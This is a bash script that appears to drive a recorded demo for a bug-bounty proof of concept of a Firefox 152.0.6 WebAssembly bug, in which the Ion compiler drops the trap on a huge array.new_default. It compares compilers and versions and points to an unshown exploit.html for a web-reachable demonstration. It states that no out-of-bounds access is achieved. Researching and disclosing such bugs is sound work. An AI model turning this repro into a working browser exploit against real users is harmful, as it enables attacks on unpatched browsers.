#!/bin/bash
# run_demo.sh — terminal demo driver for the video PoC. Record this running, then the browser.
# Runs entirely on Linux against the exact 152.0.6 shell. Deterministic.
set -u
cd "$(dirname "$0")"
JS152=$(find ~/bb/targets/nemesis-sm/sm-152rel -name js -type f 2>/dev/null | head -1)
banner(){ printf '\n\033[1;36m========== %s ==========\033[0m\n' "$1"; sleep 2; }
pause(){ sleep 3; }

banner "SHOT 0 — target version proof (Firefox 152.0.6, latest release)"
"$JS152" --version
grep -H . ~/bb/targets/ff-152.0.6-src/tree/firefox-152.0.6/config/milestone.txt
pause

banner "SHOT 1 — the bug: same module, two compilers, different outcome"
echo '--- poc.wat (array.new_default with length 0xFFFFFFFF must trap) ---'; cat poc.wat
echo; echo '>>> baseline (correct):'; "$JS152" --wasm-compiler=baseline   repro.js
echo     '>>> optimizing / Ion (BUG — trap eliminated):'; "$JS152" --wasm-compiler=optimizing repro.js
pause

banner "SHOT 2 — differential matrix across 152.0.6 / 153.0 / 155.0a1 Nightly"
python3 poc_differential.py --auto
pause

banner "SHOT 3 — dependency-free C++ builder emits the module + proves it"
g++ -std=c++17 -O2 wasm_poc_builder.cpp -o wasm_poc_builder 2>/dev/null
./wasm_poc_builder "$JS152"
pause

banner "SHOT 4 — memory-safety ceiling (honest): array result LIVE => Ion traps correctly"
echo '(no OOB — only the dead-result alloc-trap is elided)'
"$JS152" --wasm-compiler=optimizing -e '
var wat="(module (type $a (array (mut i32))) (func (export \"run\")(result i32) i32.const -1 array.new_default $a array.len))";
try{print("array.len live => RES "+new WebAssembly.Instance(new WebAssembly.Module(wasmTextToBinary(wat)),{}).exports.run());}
catch(e){print("array.len live => "+(e instanceof WebAssembly.RuntimeError?"TRAP (correct, contained)":e));}'
pause

banner "NEXT: open exploit.html in Firefox for the browser (web-reachable) shot"
echo "  firefox $(pwd)/exploit.html"
